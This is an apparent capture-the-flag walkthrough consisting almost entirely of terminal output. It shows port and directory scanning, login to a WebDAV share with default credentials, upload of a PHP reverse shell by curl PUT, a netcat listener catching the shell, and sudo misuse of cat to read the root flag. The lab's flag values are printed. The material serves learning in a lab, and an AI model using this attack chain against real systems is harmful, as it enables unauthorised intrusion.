# nmap
```
root@kali:~# nmap -sV -sC -p- 10.10.79.69
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 09:29 UTC
Nmap scan report for ip-10-10-79-69.eu-west-1.compute.internal (10.10.79.69)
Host is up (0.0051s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:22:63:EE:EC:04 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds
root@kali:~#

```


# gobuster
```
root@kali:~# gobuster dir -u http://10.10.79.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,xml,php,conf,gz,xhtml
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.79.69
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xml,php,conf,gz,xhtml,txt,html
[+] Timeout:        10s
===============================================================
2020/05/26 09:39:15 Starting gobuster
===============================================================
/index.html (Status: 200)
/webdav (Status: 401)
```

```
/webdav/
wampp:xampp

http://10.10.79.69/webdav/passwd.dav

wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91


root@kali:~# vi hash.txt
root@kali:~# hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v5.1.0) starting...


root@kali:~# curl -T php-reverse.php --url http://10.10.79.69/webdav/re.php -X PUT -u wampp:xampp
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/re.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.79.69 Port 80</address>
</body></html>
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.178.137] from (UNKNOWN) [10.10.79.69] 53518
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:38:40 up  1:12,  0 users,  load average: 4.40, 4.72, 4.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls -al
total 92
drwxr-xr-x  22 root root  4096 Aug 25  2019 .
drwxr-xr-x  22 root root  4096 Aug 25  2019 ..
drwxr-xr-x   2 root root  4096 Aug 25  2019 bin
drwxr-xr-x   3 root root  4096 Aug 25  2019 boot
drwxr-xr-x  17 root root  3700 May 26 02:25 dev
drwxr-xr-x  90 root root  4096 Aug 25  2019 etc
drwxr-xr-x   4 root root  4096 Aug 25  2019 home
lrwxrwxrwx   1 root root    33 Aug 25  2019 initrd.img -> boot/initrd.img-4.4.0-159-generic
lrwxrwxrwx   1 root root    33 Aug 25  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x  19 root root  4096 Aug 25  2019 lib
drwxr-xr-x   2 root root  4096 Aug 25  2019 lib64
drwx------   2 root root 16384 Aug 25  2019 lost+found
drwxr-xr-x   4 root root  4096 Aug 25  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Aug 25  2019 opt
dr-xr-xr-x 110 root root     0 May 26 02:25 proc
drwx------   3 root root  4096 Aug 25  2019 root
drwxr-xr-x  18 root root   520 May 26 02:25 run
drwxr-xr-x   2 root root 12288 Aug 25  2019 sbin
drwxr-xr-x   2 root root  4096 Feb 26  2019 srv
dr-xr-xr-x  13 root root     0 May 26 02:25 sys
drwxrwxrwt   9 root root  4096 May 26 03:39 tmp
drwxr-xr-x  10 root root  4096 Aug 25  2019 usr
drwxr-xr-x  12 root root  4096 Aug 25  2019 var
lrwxrwxrwx   1 root root    30 Aug 25  2019 vmlinuz -> boot/vmlinuz-4.4.0-159-generic
lrwxrwxrwx   1 root root    30 Aug 25  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
$ whoami
www-data
$

============================================================
2020/05/26 10:41:59 Finished
===============================================================
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.178.137] from (UNKNOWN) [10.10.79.69] 53534
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:42:14 up  1:16,  0 users,  load average: 2.71, 4.16, 4.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
merlin
wampp
$ cd wampp
$ ls -al
total 20
drwxr-xr-x 2 wampp wampp 4096 Aug 25  2019 .
drwxr-xr-x 4 root  root  4096 Aug 25  2019 ..
-rw-r--r-- 1 wampp wampp  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 wampp wampp 3771 Aug 25  2019 .bashrc
-rw-r--r-- 1 wampp wampp  655 Aug 25  2019 .profile
$ cd ../
$ cd merlin
$ ls -al
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
$ 

```
